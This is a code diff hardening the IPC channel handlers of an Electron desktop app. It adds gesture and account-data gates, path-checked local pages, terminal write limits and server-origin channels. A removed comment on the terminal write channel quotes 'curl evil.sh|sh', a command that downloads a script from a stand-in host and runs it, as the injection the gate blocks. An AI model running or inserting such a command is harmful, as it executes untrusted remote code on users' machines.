@@ -1,3 +1,5 @@
+import { normalize } from 'node:path'
+import { fileURLToPath } from 'node:url'
 import {
   type BrowserPanelAction,
   type BrowserPanelAnchor,
@@ -9,6 +11,8 @@ import {
 } from '@sim/browser-protocol'
 import {
   type DesktopNotificationPayload,
+  type DesktopServerChangeResult,
+  type DesktopServerConfiguration,
   type DesktopUpdateState,
   type DesktopWindowState,
   type DesktopZoomPercent,
@@ -17,14 +21,17 @@ import {
   isDesktopZoomPercent,
   isPendingDesktopScopeId,
 } from '@sim/desktop-bridge'
+import { createLogger } from '@sim/logger'
 import {
   isTerminalOperation,
   isTerminalToolName,
   type TerminalToolArgs,
 } from '@sim/terminal-protocol'
+import { getErrorMessage } from '@sim/utils/errors'
 import { isRecordLike } from '@sim/utils/object'
+import { PASTE_LIMITS, utf8ByteLength } from '@sim/utils/paste'
 import type { BrowserWindow, IpcMainEvent, IpcMainInvokeEvent, WebContents } from 'electron'
-import { clipboard, ipcMain } from 'electron'
+import { clipboard, ipcMain, shell } from 'electron'
 import {
   type BrowserToolQueueBoundary,
   cancelActiveTool,
@@ -70,6 +77,7 @@ import {
   importChromePasswords,
   listChromeImportProfiles,
 } from '@/main/browser-import'
+import { getSearchSuggestions } from '@/main/browser-search/suggestions'
 import { listSites } from '@/main/browser-sites'
 import { isSafeInternalPath } from '@/main/config'
 import type { DesktopSettingsService } from '@/main/desktop-settings'
@@ -81,8 +89,58 @@ import type { ScopedEventRouter } from '@/main/scoped-event-router'
 import type { TerminalRegistry } from '@/main/terminal/registry'
 import { findCachedTerminalThemeProfile, listTerminalThemeProfiles } from '@/main/terminal-themes'
 
+const logger = createLogger('DesktopIpc')
+
 /** Workspace/chat ids are opaque tokens; anything else never reaches a URL. */
 const ID_PATTERN = /^[A-Za-z0-9_-]{1,128}$/
+const TERMINAL_WRITE_CHUNK_CHARACTERS = 64 * 1024
+
+function writeTerminalText(
+  terminal: TerminalRegistry,
+  scope: string,
+  terminalId: string,
+  text: string,
+  owner?: WebContents
+): boolean {
+  let start = 0
+  while (start < text.length) {
+    let end = Math.min(start + TERMINAL_WRITE_CHUNK_CHARACTERS, text.length)
+    const finalCode = text.charCodeAt(end - 1)
+    if (end < text.length && finalCode >= 0xd800 && finalCode <= 0xdbff) end -= 1
+    const chunk = text.slice(start, end)
+    if (owner) {
+      if (!terminal.writeUserInput(scope, terminalId, chunk, owner)) return false
+    } else {
+      terminal.write(scope, terminalId, chunk)
+    }
+    start = end
+  }
+  return true
+}
+
+const MICROPHONE_SETTINGS_URLS: Partial<Record<NodeJS.Platform, string>> = {
+  darwin: 'x-apple.systempreferences:com.apple.preference.security?Privacy_Microphone',
+  win32: 'ms-settings:privacy-microphone',
+}
+
+/** Opens the native microphone privacy pane without accepting a renderer-provided URL. */
+export async function openMicrophoneSettings(
+  platform: NodeJS.Platform = process.platform
+): Promise<boolean> {
+  const settingsUrl = MICROPHONE_SETTINGS_URLS[platform]
+  if (!settingsUrl) return false
+
+  try {
+    await shell.openExternal(settingsUrl)
+    return true
+  } catch (error) {
+    logger.warn('Could not open microphone privacy settings', {
+      error: getErrorMessage(error),
+      platform,
+    })
+    return false
+  }
+}
 
 /**
  * Desktop state is partitioned by the existing chat id. A new-chat view uses
@@ -95,6 +153,7 @@ function parseDesktopScope(raw: unknown): string | null {
 export interface OAuthConnectScope {
   workspaceId?: string
   credentialId?: string
+  draftId?: string
   chatAttemptId?: string
 }
 
@@ -110,9 +169,10 @@ export function parseOAuthConnectScope(raw: unknown): OAuthConnectScope | undefi
   if (typeof raw !== 'object') {
     return undefined
   }
-  const { workspaceId, credentialId, chatAttemptId } = raw as {
+  const { workspaceId, credentialId, draftId, chatAttemptId } = raw as {
     workspaceId?: unknown
     credentialId?: unknown
+    draftId?: unknown
     chatAttemptId?: unknown
   }
   if (
@@ -127,6 +187,9 @@ export function parseOAuthConnectScope(raw: unknown): OAuthConnectScope | undefi
   ) {
     return undefined
   }
+  if (draftId !== undefined && (typeof draftId !== 'string' || !ID_PATTERN.test(draftId))) {
+    return undefined
+  }
   if (
     chatAttemptId !== undefined &&
     (typeof chatAttemptId !== 'string' || !ID_PATTERN.test(chatAttemptId))
@@ -136,6 +199,7 @@ export function parseOAuthConnectScope(raw: unknown): OAuthConnectScope | undefi
   return {
     ...(workspaceId !== undefined ? { workspaceId } : {}),
     ...(credentialId !== undefined ? { credentialId } : {}),
+    ...(draftId !== undefined ? { draftId } : {}),
     ...(chatAttemptId !== undefined ? { chatAttemptId } : {}),
   }
 }
@@ -259,6 +323,10 @@ export function parseDesktopNotificationPayload(raw: unknown): DesktopNotificati
 export interface IpcDeps {
   appOrigin: () => string
   allowHttpLocalhost: () => boolean
+  /** False while local account-data persistence is unavailable or teardown must be retried. */
+  accountDataAvailable: () => boolean
+  /** Absolute paths of the bundled recovery pages allowed to control the shell. */
+  localPagePaths: readonly string[]
   retryLoad: (sender: WebContents) => void
   localFilesystem: LocalFilesystemService
   terminal: TerminalRegistry
@@ -294,6 +362,11 @@ export interface IpcDeps {
     check: () => void
     install: () => void
   }
+  server: {
+    open: () => void
+    getConfiguration: () => DesktopServerConfiguration
+    setOrigin: (origin: string) => Promise<DesktopServerChangeResult>
+  }
 }
 
 /**
@@ -321,6 +394,10 @@ interface ChannelSpecBase {
   gate: ChannelGate
   passSender?: boolean
   requires?: ChannelFeature
+  /** Account-bearing storage must be readable and writable before this channel can run. */
+  requiresAccountData?: boolean
+  /** Requires a recent trusted input event for every call, or only selected argument shapes. */
+  needsUserActivation?: boolean | ((args: readonly unknown[]) => boolean)
   /**
    * Why this channel's `gate` or `requires` deviates from the rest of its
    * name family. Required by `check:desktop-ipc` for any channel that does,
@@ -336,26 +413,24 @@ interface ChannelSpecBase {
 type ChannelSpec =
   | (ChannelSpecBase & {
       kind: 'invoke'
-      /** Requires an in-progress user gesture in the calling page. */
-      needsUserActivation?: boolean
       /** Returned to the caller when a gate rejects the call. */
       denied: unknown
       handler: (...args: unknown[]) => unknown
     })
   | (ChannelSpecBase & {
       kind: 'send'
-      /**
-       * Requires recent real OS input before a payload is forwarded. Payload-
-       * scoped rather than channel-scoped because the same channel also carries
-       * terminal replies the PTY solicits, which arrive with no user input.
-       */
-      payloadNeedsDeliberateInput?: boolean
       handler: (...args: unknown[]) => void
     })
 
-function isLocalPageSender(event: IpcMainEvent | IpcMainInvokeEvent): boolean {
+function isLocalPageSender(
+  event: IpcMainEvent | IpcMainInvokeEvent,
+  localPagePaths: readonly string[]
+): boolean {
   try {
-    return new URL(event.senderFrame?.url ?? '').protocol === 'file:'
+    const url = new URL(event.senderFrame?.url ?? '')
+    if (url.protocol !== 'file:') return false
+    const senderPath = normalize(fileURLToPath(url))
+    return localPagePaths.some((allowedPath) => senderPath === normalize(allowedPath))
   } catch {
     return false
   }
@@ -403,44 +478,16 @@ function senderHasUserGesture(event: IpcMainEvent | IpcMainInvokeEvent): boolean
  * machine-generated and self-delimiting, which is what makes them safe to
  * enumerate.
  *
- * Bodies are printable-only ({@link PTY_REPLY_BODY}), never `[\s\S]`. A real
- * DCS or OSC reply carries text terminated by ST or BEL and never a control
- * byte, so an unbounded interior would let a hostile renderer wrap a whole
- * command and its submit inside a fake `ESC ] ... CR BEL` and be waved through
- * as a reply, reopening the path this gate exists to close. X10 mouse is
- * bounded the same way: its three bytes are offset by 32, so a control byte
- * there is never legitimate either.
+ * Only numeric/fixed device reports and fixed focus reports are included. DCS,
+ * OSC, and mouse responses are deliberately excluded even when well-formed:
+ * they do not need an unconditional path around the trusted-input gate.
  */
-const PTY_REPLY_BODY = '[\\u0020-\\u00ff]'
-const PTY_REPLY_PATTERNS = [
-  /\u001b\[[0-9;?]*[Rc]/, // DSR cursor position, device attributes
-  /\u001b\[[IO]/, // focus in/out (mode 1004)
-  new RegExp(`\\u001b\\[M${PTY_REPLY_BODY}{3}`), // X10 mouse report
-  /\u001b\[<[0-9;]*[mM]/, // SGR mouse report
-  new RegExp(`\\u001bP${PTY_REPLY_BODY}*?\\u001b\\\\`), // DCS response
-  new RegExp(`\\u001b\\]${PTY_REPLY_BODY}*?(?:\\u0007|\\u001b\\\\)`), // OSC response
-]
+const PTY_REPLY_PATTERNS = [/\u001b\[[0-9;?]*[Rc]/, /\u001b\[[IO]/]
 const PTY_REPLY = new RegExp(
   `^(?:${PTY_REPLY_PATTERNS.map((pattern) => pattern.source).join('|')})+$`
 )
-
-/**
- * Whether a terminal-write payload needs a person behind it.
- *
- * The reply set is enumerated and everything else is gated, rather than the
- * other way round. "What submits" is not a closed set: besides carriage return
- * and newline, EOT (`0x04`) hands a partial line straight to a reader in
- * canonical mode, and `0x0f` is `operate-and-get-next` in bash and
- * `accept-line-and-down-history` in zsh — both of which execute the current
- * line. A user's own `inputrc` or `zle` bindings can add more. Enumerating that
- * set would leave whichever binding was forgotten ungated, so the allowlist runs
- * the other way and fails closed.
- */
-function needsDeliberateInputForWrite(args: unknown[]): boolean {
-  const data = args[1]
-  if (typeof data !== 'string' || data.length === 0) return false
-  return !PTY_REPLY.test(data)
-}
+const MAX_TERMINAL_WRITE_CHARS = 256_000
+const MAX_PTY_REPLY_CHARS = 8_192
 
 interface DesktopToolAuthorization {
   chatId: string
@@ -607,17 +654,27 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'desktop:open-external': {
       kind: 'invoke',
       gate: 'any',
+      needsUserActivation: true,
       deviationReason:
         'the offline and error pages are local-page senders, not app-origin, and handing a support link to the system browser is the one action that must work when the app cannot reach its origin at all',
       denied: false,
       handler: (url) =>
         typeof url === 'string' ? openExternalSafe(url, deps.allowHttpLocalhost()) : false,
     },
+    'desktop:open-microphone-settings': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      needsUserActivation: true,
+      denied: false,
+      handler: () => openMicrophoneSettings(),
+    },
     // OAuth connect handoff: the whole flow runs in the system browser (state
     // is cookie-bound to the initiating user agent), returning via loopback.
     'desktop:oauth-connect': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
+      needsUserActivation: true,
       denied: false,
       handler: (providerId, scope) => {
         if (typeof providerId !== 'string') {
@@ -633,6 +690,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'desktop:local-filesystem': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       denied: {
         ok: false,
         code: 'ACCESS_DENIED',
@@ -649,10 +707,20 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'desktop:settings:set': {
       kind: 'invoke',
       gate: 'app-origin',
+      needsUserActivation: ([key]) => key === 'launchAtLogin',
       denied: null,
       handler: (key, value) =>
         isDesktopPreferenceKey(key) && typeof value === 'boolean'
           ? deps.settings.setPreference(key, value)
+          : deps.settings.getPreferences(),
+    },
+    'desktop:settings:set-browser-search-suggestions': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      denied: null,
+      handler: (enabled) =>
+        typeof enabled === 'boolean'
+          ? deps.settings.setBrowserSearchSuggestionsEnabled(enabled)
           : deps.settings.getPreferences(),
     },
     'desktop:settings:set-appearance': {
@@ -738,11 +806,13 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'desktop:updates:check': {
       kind: 'send',
       gate: 'app-origin',
+      needsUserActivation: true,
       handler: () => deps.updates.check(),
     },
     'desktop:updates:install': {
       kind: 'send',
       gate: 'app-origin',
+      needsUserActivation: true,
       handler: () => deps.updates.install(),
     },
     'browser-agent:execute-tool': {
@@ -917,14 +987,26 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-agent:get-known-sessions': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       deviationReason:
         "read/reset of the surface's own data; gating it on the surface would strand the browsing trail with no way to inspect or erase it",
       denied: { sessions: [] },
       handler: () => getKnownSessions(),
     },
+    'browser-agent:search-suggestions': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      denied: [],
+      handler: (query) =>
+        deps.settings.getPreferences().browserSearchSuggestionsEnabled === false
+          ? []
+          : getSearchSuggestions(query),
+    },
     'browser-agent:clear-browsing-data': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       deviationReason:
         'erasing browsing data has to work with the browser off, which is the state a user clearing it is most likely to be in',
       needsUserActivation: true,
@@ -999,6 +1081,10 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'browser',
       passSender: true,
+      needsUserActivation: ([action]) =>
+        isRecordLike(action) &&
+        action.action === 'respond-media-permission' &&
+        action.allowed === true,
       handler: (sender, action, rawScope) => {
         const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
         if (
@@ -1248,12 +1334,14 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-credentials:available': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       denied: false,
       handler: () => credentialsAvailable(),
     },
     'browser-credentials:list': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       denied: [],
       handler: () => listCredentials(),
     },
@@ -1278,6 +1366,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-import:sites': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       deviationReason:
         'a read of already-imported data; settings lists these hosts to show what an import brought over, which is what you look at while deciding whether to enable the browser',
       denied: [],
@@ -1289,6 +1378,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-credentials:reveal': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       needsUserActivation: true,
       denied: null,
       handler: (id) => (typeof id === 'string' ? revealCredential(id) : null),
@@ -1296,6 +1386,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-credentials:copy': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       needsUserActivation: true,
       denied: false,
       handler: (id) => (typeof id === 'string' ? copyCredential(id) : false),
@@ -1303,6 +1394,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-credentials:forget': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       needsUserActivation: true,
       denied: [],
       handler: (id) => (typeof id === 'string' ? forgetCredential(id) : listCredentials()),
@@ -1310,6 +1402,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     'browser-credentials:forget-all': {
       kind: 'invoke',
       gate: 'app-origin',
+      requiresAccountData: true,
       needsUserActivation: true,
       denied: [],
       handler: () => forgetAllCredentials(),
@@ -1469,18 +1562,20 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       requires: 'terminal',
       passSender: true,
       denied: false,
-      // The bytes come from the clipboard here, not from the caller, so this
-      // does not need the write gate: a compromised renderer can only replay
-      // what the user already copied. It still needs a real gesture, because
-      // the legitimate caller is a Paste click or ⌘V.
+      // Paste is the sole interactive operation whose bytes do not originate
+      // in the renderer. The shell reads the clipboard itself after a fresh
+      // click/shortcut and still requires visible, focused active-tab
+      // ownership below.
       needsUserActivation: true,
       handler: (sender, terminalId, rawScope) => {
         const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
         if (!scope || typeof terminalId !== 'string') return false
         const text = clipboard.readText()
         if (!text) return false
-        deps.terminal.write(scope, terminalId, text)
-        return true
+        if (utf8ByteLength(text, PASTE_LIMITS.TERMINAL_BYTES) > PASTE_LIMITS.TERMINAL_BYTES) {
+          return 'too-large'
+        }
+        return writeTerminalText(deps.terminal, scope, terminalId, text, sender as WebContents)
       },
     },
     'terminal:scrollback': {
@@ -1571,10 +1666,19 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: false,
-      handler: (rawScope) => {
+      handler: (sender, rawScope) => {
         const scope = parseDesktopScope(rawScope)
-        if (!scope || !isPendingDesktopScopeId(scope)) return false
+        const contents = sender as WebContents
+        if (
+          !scope ||
+          !isPendingDesktopScopeId(scope) ||
+          !terminalPendingScopesBySender.get(contents)?.has(scope)
+        ) {
+          return false
+        }
+        consumePendingScope(terminalPendingScopesBySender, contents, scope)
         deps.terminal.disposeScope(scope)
         return true
       },
@@ -1583,10 +1687,18 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: false,
-      handler: (rawScope) => {
+      handler: (sender, rawScope) => {
         const scope = parseDesktopScope(rawScope)
-        if (!scope || isPendingDesktopScopeId(scope)) return false
+        const contents = sender as WebContents
+        if (
+          !scope ||
+          isPendingDesktopScopeId(scope) ||
+          terminalScopeBySender.get(contents) !== scope
+        ) {
+          return false
+        }
         const suspended = deps.terminal.suspendScope(scope)
         if (suspended) {
           deps.scopeEvents.sendTerminal(scope, 'terminal:scope-suspended', scope)
@@ -1649,13 +1761,15 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'terminal',
       passSender: true,
+      needsUserActivation: true,
       denied: { tabs: [], activeTerminalId: null },
       handler: (sender, terminalId, rawScope) => {
-        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        const contents = sender as WebContents
+        const scope = activeRendererScope(terminalScopeBySender, contents, rawScope)
         if (!scope) return { tabs: [], activeTerminalId: null }
         const tabs =
           typeof terminalId === 'string'
-            ? deps.terminal.closeTerminal(scope, terminalId)
+            ? deps.terminal.closeUserTerminal(scope, terminalId, contents)
             : deps.terminal.getTabs(scope)
         return { ...tabs, scopeId: scope }
       },
@@ -1668,19 +1782,15 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       handler: (sender, terminalId, data, rawScope) => {
         const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
         if (!scope || typeof terminalId !== 'string' || typeof data !== 'string') return
-        deps.terminal.write(scope, terminalId, data)
+        if (data.length === 0 || data.length > MAX_TERMINAL_WRITE_CHARS) return
+        if (data.length <= MAX_PTY_REPLY_CHARS && PTY_REPLY.test(data)) {
+          writeTerminalText(deps.terminal, scope, terminalId, data)
+          return
+        }
+        const contents = sender as WebContents
+        if (!hasRecentDeliberateInput(contents)) return
+        writeTerminalText(deps.terminal, scope, terminalId, data, contents)
       },
-      // An XSS'd or hostile origin must not reach `write(id, 'curl evil.sh|sh\r')`.
-      // Panel focus is deliberately not used — `terminal:focused` is a
-      // renderer-asserted claim the same attacker can set.
-      //
-      // MITIGATION, NOT CLOSURE. Text without a newline still reaches the shell's
-      // line buffer, where the user's own next Enter submits it — visible on
-      // screen, but not prevented. Closing that needs the interactive path off
-      // the renderer surface entirely (main writing the keystrokes it already
-      // observes) or the terminal in its own WebContents, neither of which is a
-      // gate change. Tracked as follow-up.
-      payloadNeedsDeliberateInput: true,
     },
     'terminal:resize': {
       kind: 'send',
@@ -1698,18 +1808,36 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         deps.terminal.resize(scope, terminalId, toCellCount(cols, 1), toCellCount(rows, 1))
       },
     },
-    'terminal:dispose': {
-      kind: 'send',
-      gate: 'app-origin',
-      deviationReason:
-        'tearing the surface down must survive the surface being off, or a terminal left running when the feature was disabled could never be reaped',
-      handler: () => deps.terminal.dispose(),
-    },
     'offline:retry': {
       kind: 'send',
       gate: 'local-page',
       passSender: true,
       handler: (sender) => deps.retryLoad(sender as WebContents),
+    },
+    // The `server:` family is local-page only, and deliberately so: the one
+    // surface that repoints the shell at another deployment must keep working
+    // when the current one is unreachable (the offline page is where a
+    // self-hoster with a typo'd origin actually lands), and must never be
+    // drivable by a page the current server serves.
+    'server:open': {
+      kind: 'send',
+      gate: 'local-page',
+      handler: () => deps.server.open(),
+    },
+    'server:get-configuration': {
+      kind: 'invoke',
+      gate: 'local-page',
+      denied: null,
+      handler: () => deps.server.getConfiguration(),
+    },
+    'server:set-origin': {
+      kind: 'invoke',
+      gate: 'local-page',
+      denied: { ok: false, error: 'The server can only be changed from the Sim app itself.' },
+      handler: (origin) =>
+        typeof origin === 'string'
+          ? deps.server.setOrigin(origin)
+          : { ok: false, error: 'Server URL is required' },
     },
   }
 
@@ -1717,20 +1845,38 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     if (gate === 'any') return true
     if (gate === 'app-origin') return isAppOriginSender(event, deps.appOrigin())
     if (gate === 'browser-page') return isAgentWebContents(event.sender)
-    return isLocalPageSender(event)
+    return isLocalPageSender(event, deps.localPagePaths)
   }
 
   const featureAllowed = (feature: ChannelFeature | undefined): boolean => {
     if (!feature) return true
+    if (!deps.accountDataAvailable()) return false
     const preferences = deps.settings.getPreferences()
     return feature === 'browser' ? preferences.browserEnabled : preferences.terminalEnabled
   }
 
+  const accountDataAllowed = (spec: ChannelSpec): boolean =>
+    spec.requiresAccountData !== true || deps.accountDataAvailable()
+
+  const requiresUserActivation = (
+    requirement: ChannelSpecBase['needsUserActivation'],
+    args: readonly unknown[]
+  ): boolean => (typeof requirement === 'function' ? requirement(args) : requirement === true)
+
   for (const [channel, spec] of Object.entries(channels)) {
     if (spec.kind === 'invoke') {
       ipcMain.handle(channel, async (event, ...args) => {
-        if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return spec.denied
-        if (spec.needsUserActivation && !senderHasUserGesture(event)) {
+        if (
+          !senderAllowed(event, spec.gate) ||
+          !featureAllowed(spec.requires) ||
+          !accountDataAllowed(spec)
+        ) {
+          return spec.denied
+        }
+        if (
+          requiresUserActivation(spec.needsUserActivation, args) &&
+          !senderHasUserGesture(event)
+        ) {
           return spec.denied
         }
         let handlerArgs = args
@@ -1743,6 +1889,8 @@ export function registerIpcHandlers(deps: IpcDeps): void {
           const authorization = await fetchDesktopToolAuthorization(event, deps, args[0])
           if (
             !authorization ||
+            !requestedScope ||
+            authorization.chatId !== requestedScope ||
             typeof requestedTool !== 'string' ||
             authorization.toolName !== requestedTool ||
             !isBrowserToolName(authorization.toolName)
@@ -1807,11 +1955,16 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       })
     } else {
       ipcMain.on(channel, (event, ...args) => {
-        if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return
         if (
-          spec.payloadNeedsDeliberateInput &&
-          needsDeliberateInputForWrite(args) &&
-          !hasRecentDeliberateInput(event.sender)
+          !senderAllowed(event, spec.gate) ||
+          !featureAllowed(spec.requires) ||
+          !accountDataAllowed(spec)
+        ) {
+          return
+        }
+        if (
+          requiresUserActivation(spec.needsUserActivation, args) &&
+          !senderHasUserGesture(event)
         ) {
           return
         }
